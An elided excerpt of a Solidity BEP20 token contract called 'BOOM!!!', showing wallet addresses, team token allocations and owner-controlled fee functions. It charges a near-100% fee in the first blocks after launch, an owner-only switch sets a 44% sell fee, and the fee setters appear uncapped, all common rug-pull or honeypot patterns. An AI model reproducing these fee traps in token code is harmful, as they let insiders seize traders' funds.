...
Telegram - https://t.me/BOOM_EXCLAMATION
Website  - https://boomboom.pro/
...
contract BOOM_EXCLAMATION is IBEP20, Auth {
    using SafeMath for uint256;

    address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0x8f360a6a0ca60f12e8fe4322bcc9caE0a3b20ac7;

    address private autoLiquidityReceiver;
    address private marketingFeeReceiver;

    string constant _name = "BOOM!!!";
    ...
    uint256 GREEDDuration = 120;
    
    uint256 fuckManesty = 3;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x95263881a80402fd68437B6c842E642517E68b22;
    ...
    function initialize(address team1, address team2, address team3, address team4, address team5, address stakingWallet) external authorized {
        uint256 burnValue = _totalSupply * 30 / 100;
        uint256 teamToken = _totalSupply * 1 / 100;
        uint256 stakingToken = _totalSupply * 15 / 100;
        isFeeExempt[team1] = true;
        isFeeExempt[team2] = true;
        isFeeExempt[stakingWallet] = true;
        
        _basicTransfer(msg.sender, DEAD, burnValue);
        _basicTransfer(msg.sender, team1, teamToken);
        _basicTransfer(msg.sender, team2, teamToken);
        _basicTransfer(msg.sender, team3, teamToken);
        _basicTransfer(msg.sender, team4, teamToken);
        _basicTransfer(msg.sender, team5, teamToken);
        _basicTransfer(msg.sender, stakingWallet, stakingToken);
    }
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        if(launchedAt + fuckManesty >= block.number){ return feeDenominator.sub(1); }
    ...
    function OxfuckManesty(bool _status, uint256 _fucker) public onlyOwner {
        tradingOpen = _status;
        fuckManesty = _fucker;
        launch();

        setBuyFees(0, 0, 1, 25, 0, 100);
        setSellFees(0, 0, 1, 44, 0, 100);

    }

    function normalizeTax() external authorized {
        setBuyFees(1, 0, 5, 6, 0, 100);
        setSellFees(1, 0, 5, 6, 0, 100);
        GREEDTriggeredAt = 0;
    }
    ...
    function setBuyFees(uint256 _liquidityFeeBuy, uint256 _buybackFeeBuy, uint256 _reflectionFeeBuy, uint256 _marketingFeeBuy, uint256 _devFeeBuy, uint256 _feeDenominator) public authorized {
    ...
    function setSellFees(uint256 _liquidityFeeSell, uint256 _buybackFeeSell, uint256 _reflectionFeeSell, uint256 _marketingFeeSell, uint256 _devFeeSell, uint256 _feeDenominator) public authorized {
